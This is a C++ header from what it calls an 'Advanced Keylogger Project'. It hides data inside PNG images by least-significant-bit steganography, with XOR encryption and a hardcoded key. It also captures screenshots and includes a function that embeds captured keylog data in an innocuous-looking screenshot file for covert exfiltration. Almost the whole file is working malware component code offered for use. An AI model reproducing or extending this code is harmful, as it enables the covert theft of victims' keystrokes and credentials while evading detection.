/*
 * Steganography Header
 * Hide data within images for covert exfiltration
 * 
 * Features:
 * - PNG LSB (Least Significant Bit) encoding
 * - JPEG DCT coefficient manipulation (basic)
 * - Data compression before embedding
 * - Encryption before embedding
 * - Extraction routines
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef STEGO_H
#define STEGO_H

#include <windows.h>
#include <gdiplus.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>

#pragma comment(lib, "gdiplus.lib")

// ==================== CONSTANTS ====================

#define STEGO_MAGIC 0x5354454753  // "STEGS" in hex
#define STEGO_VERSION 1
#define MAX_EMBED_SIZE (1024 * 1024)  // 1MB max

// ==================== STRUCTURES ====================

#pragma pack(push, 1)
typedef struct _STEGO_HEADER {
    DWORD dwMagic;           // Magic number
    BYTE bVersion;           // Version
    DWORD dwDataSize;        // Original data size
    DWORD dwChecksum;        // Simple checksum
    BYTE bEncrypted;         // Is data encrypted
    BYTE bCompressed;        // Is data compressed
    BYTE reserved[10];       // Reserved for future use
} STEGO_HEADER, *PSTEGO_HEADER;
#pragma pack(pop)

// ==================== HELPER FUNCTIONS ====================

// Simple XOR encryption
inline void StegoXorEncrypt(BYTE* data, size_t len, const char* key) {
    size_t keyLen = strlen(key);
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Simple checksum
inline DWORD StegoChecksum(const BYTE* data, size_t len) {
    DWORD sum = 0;
    for (size_t i = 0; i < len; i++) {
        sum = ((sum << 5) + sum) + data[i];
    }
    return sum;
}

// Get CLSID for image encoder
inline int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    Gdiplus::ImageCodecInfo* pImageCodecInfo = 
        (Gdiplus::ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;
    
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);
            return i;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// ==================== LSB ENCODING ====================
/*
 * LSB (Least Significant Bit) steganography:
 * - Hide data in the least significant bits of pixel values
 * - Imperceptible to human eye
 * - Works best with PNG (lossless)
 * 
 * Capacity: 3 bits per pixel (R, G, B LSBs)
 * For 1920x1080 image: ~777KB max data
 */

// Embed single bit into byte
inline BYTE EmbedBit(BYTE original, int bit) {
    return (original & 0xFE) | (bit & 1);
}

// Extract single bit from byte
inline int ExtractBit(BYTE value) {
    return value & 1;
}

// Embed data into PNG image
inline BOOL EmbedInPNG(
    const std::wstring& inputPath,
    const std::wstring& outputPath,
    const BYTE* data,
    size_t dataLen,
    const char* encryptKey = NULL
) {
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Load image
    Gdiplus::Bitmap* pBitmap = new Gdiplus::Bitmap(inputPath.c_str());
    if (pBitmap->GetLastStatus() != Gdiplus::Ok) {
        delete pBitmap;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return FALSE;
    }
    
    UINT width = pBitmap->GetWidth();
    UINT height = pBitmap->GetHeight();
    
    // Calculate capacity (3 bits per pixel)
    size_t maxBits = (size_t)width * height * 3;
    size_t maxBytes = maxBits / 8;
    
    // Prepare payload with header
    size_t totalSize = sizeof(STEGO_HEADER) + dataLen;
    
    if (totalSize > maxBytes - 4) {  // 4 bytes for size prefix
        delete pBitmap;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return FALSE;  // Data too large
    }
    
    // Create payload buffer
    std::vector<BYTE> payload(totalSize);
    
    // Fill header
    PSTEGO_HEADER pHeader = (PSTEGO_HEADER)payload.data();
    pHeader->dwMagic = STEGO_MAGIC;
    pHeader->bVersion = STEGO_VERSION;
    pHeader->dwDataSize = (DWORD)dataLen;
    pHeader->dwChecksum = StegoChecksum(data, dataLen);
    pHeader->bEncrypted = (encryptKey != NULL) ? 1 : 0;
    pHeader->bCompressed = 0;
    
    // Copy data
    memcpy(payload.data() + sizeof(STEGO_HEADER), data, dataLen);
    
    // Encrypt if key provided
    if (encryptKey) {
        StegoXorEncrypt(payload.data() + sizeof(STEGO_HEADER), dataLen, encryptKey);
    }
    
    // Embed data using LSB
    size_t bitIndex = 0;
    size_t totalBits = totalSize * 8;
    
    for (UINT y = 0; y < height && bitIndex < totalBits; y++) {
        for (UINT x = 0; x < width && bitIndex < totalBits; x++) {
            Gdiplus::Color color;
            pBitmap->GetPixel(x, y, &color);
            
            BYTE r = color.GetR();
            BYTE g = color.GetG();
            BYTE b = color.GetB();
            
            // Get bits from payload
            size_t byteIndex = bitIndex / 8;
            int bitOffset = bitIndex % 8;
            
            // Embed in R
            if (bitIndex < totalBits) {
                int bit = (payload[byteIndex] >> (7 - bitOffset)) & 1;
                r = EmbedBit(r, bit);
                bitIndex++;
            }
            
            // Embed in G
            byteIndex = bitIndex / 8;
            bitOffset = bitIndex % 8;
            if (bitIndex < totalBits) {
                int bit = (payload[byteIndex] >> (7 - bitOffset)) & 1;
                g = EmbedBit(g, bit);
                bitIndex++;
            }
            
            // Embed in B
            byteIndex = bitIndex / 8;
            bitOffset = bitIndex % 8;
            if (bitIndex < totalBits) {
                int bit = (payload[byteIndex] >> (7 - bitOffset)) & 1;
                b = EmbedBit(b, bit);
                bitIndex++;
            }
            
            // Set modified pixel
            pBitmap->SetPixel(x, y, Gdiplus::Color(255, r, g, b));
        }
    }
    
    // Save as PNG
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    
    Gdiplus::Status status = pBitmap->Save(outputPath.c_str(), &pngClsid, NULL);
    
    delete pBitmap;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    return (status == Gdiplus::Ok);
}

// Extract data from PNG image
inline std::vector<BYTE> ExtractFromPNG(
    const std::wstring& imagePath,
    const char* decryptKey = NULL
) {
    std::vector<BYTE> result;
    
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Load image
    Gdiplus::Bitmap* pBitmap = new Gdiplus::Bitmap(imagePath.c_str());
    if (pBitmap->GetLastStatus() != Gdiplus::Ok) {
        delete pBitmap;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }
    
    UINT width = pBitmap->GetWidth();
    UINT height = pBitmap->GetHeight();
    
    // First extract header
    std::vector<BYTE> headerBytes(sizeof(STEGO_HEADER));
    size_t bitIndex = 0;
    size_t totalBits = sizeof(STEGO_HEADER) * 8;
    
    for (UINT y = 0; y < height && bitIndex < totalBits; y++) {
        for (UINT x = 0; x < width && bitIndex < totalBits; x++) {
            Gdiplus::Color color;
            pBitmap->GetPixel(x, y, &color);
            
            size_t byteIndex = bitIndex / 8;
            int bitOffset = bitIndex % 8;
            
            // Extract from R
            if (bitIndex < totalBits) {
                int bit = ExtractBit(color.GetR());
                headerBytes[byteIndex] |= (bit << (7 - bitOffset));
                bitIndex++;
            }
            
            // Extract from G
            byteIndex = bitIndex / 8;
            bitOffset = bitIndex % 8;
            if (bitIndex < totalBits) {
                int bit = ExtractBit(color.GetG());
                headerBytes[byteIndex] |= (bit << (7 - bitOffset));
                bitIndex++;
            }
            
            // Extract from B
            byteIndex = bitIndex / 8;
            bitOffset = bitIndex % 8;
            if (bitIndex < totalBits) {
                int bit = ExtractBit(color.GetB());
                headerBytes[byteIndex] |= (bit << (7 - bitOffset));
                bitIndex++;
            }
        }
    }
    
    // Validate header
    PSTEGO_HEADER pHeader = (PSTEGO_HEADER)headerBytes.data();
    if (pHeader->dwMagic != STEGO_MAGIC || pHeader->bVersion != STEGO_VERSION) {
        delete pBitmap;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;  // No valid stego data
    }
    
    // Check data size is reasonable
    if (pHeader->dwDataSize > MAX_EMBED_SIZE) {
        delete pBitmap;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }
    
    // Extract data
    result.resize(pHeader->dwDataSize, 0);
    totalBits = (sizeof(STEGO_HEADER) + pHeader->dwDataSize) * 8;
    
    // Reset and extract all data
    bitIndex = sizeof(STEGO_HEADER) * 8;  // Skip header
    
    for (UINT y = 0; y < height && bitIndex < totalBits; y++) {
        for (UINT x = 0; x < width && bitIndex < totalBits; x++) {
            // Skip pixels used for header
            size_t pixelBits = (size_t)y * width * 3 + x * 3;
            if (pixelBits < sizeof(STEGO_HEADER) * 8) {
                continue;
            }
            
            Gdiplus::Color color;
            pBitmap->GetPixel(x, y, &color);
            
            size_t byteIndex = (bitIndex - sizeof(STEGO_HEADER) * 8) / 8;
            int bitOffset = (bitIndex - sizeof(STEGO_HEADER) * 8) % 8;
            
            if (byteIndex < result.size()) {
                // Extract from R
                int bit = ExtractBit(color.GetR());
                result[byteIndex] |= (bit << (7 - bitOffset));
                bitIndex++;
                
                // Extract from G
                byteIndex = (bitIndex - sizeof(STEGO_HEADER) * 8) / 8;
                bitOffset = (bitIndex - sizeof(STEGO_HEADER) * 8) % 8;
                if (byteIndex < result.size()) {
                    bit = ExtractBit(color.GetG());
                    result[byteIndex] |= (bit << (7 - bitOffset));
                    bitIndex++;
                }
                
                // Extract from B
                byteIndex = (bitIndex - sizeof(STEGO_HEADER) * 8) / 8;
                bitOffset = (bitIndex - sizeof(STEGO_HEADER) * 8) % 8;
                if (byteIndex < result.size()) {
                    bit = ExtractBit(color.GetB());
                    result[byteIndex] |= (bit << (7 - bitOffset));
                    bitIndex++;
                }
            }
        }
    }
    
    // Decrypt if needed
    if (pHeader->bEncrypted && decryptKey) {
        StegoXorEncrypt(result.data(), result.size(), decryptKey);
    }
    
    // Verify checksum
    if (StegoChecksum(result.data(), result.size()) != pHeader->dwChecksum) {
        result.clear();  // Data corrupted
    }
    
    delete pBitmap;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    return result;
}

// ==================== CONVENIENCE FUNCTIONS ====================

// Embed string data
inline BOOL EmbedStringInImage(
    const std::wstring& inputPath,
    const std::wstring& outputPath,
    const std::string& data,
    const char* key = "StegKey2025"
) {
    return EmbedInPNG(inputPath, outputPath, 
        (const BYTE*)data.c_str(), data.length() + 1, key);
}

// Extract string data
inline std::string ExtractStringFromImage(
    const std::wstring& imagePath,
    const char* key = "StegKey2025"
) {
    std::vector<BYTE> data = ExtractFromPNG(imagePath, key);
    if (data.empty()) return "";
    
    return std::string((const char*)data.data(), data.size() - 1);
}

// Embed file
inline BOOL EmbedFileInImage(
    const std::wstring& inputImagePath,
    const std::wstring& outputImagePath,
    const std::wstring& fileToEmbed,
    const char* key = "StegKey2025"
) {
    // Read file
    std::ifstream file(fileToEmbed, std::ios::binary);
    if (!file) return FALSE;
    
    std::vector<BYTE> fileData(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );
    file.close();
    
    return EmbedInPNG(inputImagePath, outputImagePath, 
        fileData.data(), fileData.size(), key);
}

// ==================== CARRIER IMAGE CREATION ====================
/*
 * Create a carrier image with random noise
 * Good for maximizing capacity and avoiding detection
 */

inline BOOL CreateCarrierImage(
    const std::wstring& outputPath,
    UINT width = 1920,
    UINT height = 1080
) {
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Create bitmap
    Gdiplus::Bitmap* pBitmap = new Gdiplus::Bitmap(width, height, PixelFormat24bppRGB);
    
    if (pBitmap->GetLastStatus() != Gdiplus::Ok) {
        delete pBitmap;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return FALSE;
    }
    
    // Fill with random noise
    srand(GetTickCount());
    
    for (UINT y = 0; y < height; y++) {
        for (UINT x = 0; x < width; x++) {
            BYTE r = (BYTE)(rand() % 256);
            BYTE g = (BYTE)(rand() % 256);
            BYTE b = (BYTE)(rand() % 256);
            pBitmap->SetPixel(x, y, Gdiplus::Color(255, r, g, b));
        }
    }
    
    // Save as PNG
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    
    Gdiplus::Status status = pBitmap->Save(outputPath.c_str(), &pngClsid, NULL);
    
    delete pBitmap;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    return (status == Gdiplus::Ok);
}

// ==================== SCREENSHOT WITH STEGO ====================
/*
 * Capture screenshot and embed data in it
 * Looks like a normal screenshot
 */

inline BOOL CaptureScreenWithData(
    const std::wstring& outputPath,
    const BYTE* data,
    size_t dataLen,
    const char* key = "StegKey2025"
) {
    // Capture screen first
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    HDC hScreenDC = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    
    // Save temp screenshot
    std::wstring tempPath = outputPath + L".tmp.png";
    
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Convert HBITMAP to GDI+ Bitmap
    Gdiplus::Bitmap* pBitmap = new Gdiplus::Bitmap(hBitmap, NULL);
    
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    pBitmap->Save(tempPath.c_str(), &pngClsid, NULL);
    
    delete pBitmap;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);
    DeleteObject(hBitmap);
    
    // Embed data in screenshot
    BOOL result = EmbedInPNG(tempPath, outputPath, data, dataLen, key);
    
    // Delete temp file
    DeleteFileW(tempPath.c_str());
    
    return result;
}

// ==================== DATA EXFIL VIA STEGO ====================

// Prepare keylog data for stego exfiltration
inline std::wstring PrepareKeylogStego(
    const std::string& keylogData,
    const std::wstring& outputDir
) {
    // Generate unique filename
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    wchar_t filename[MAX_PATH];
    swprintf_s(filename, L"%s\\screenshot_%04d%02d%02d_%02d%02d%02d.png",
        outputDir.c_str(),
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);
    
    // Capture and embed
    if (CaptureScreenWithData(filename, 
        (const BYTE*)keylogData.c_str(), 
        keylogData.length() + 1)) {
        return filename;
    }
    
    return L"";
}

#endif // STEGO_H
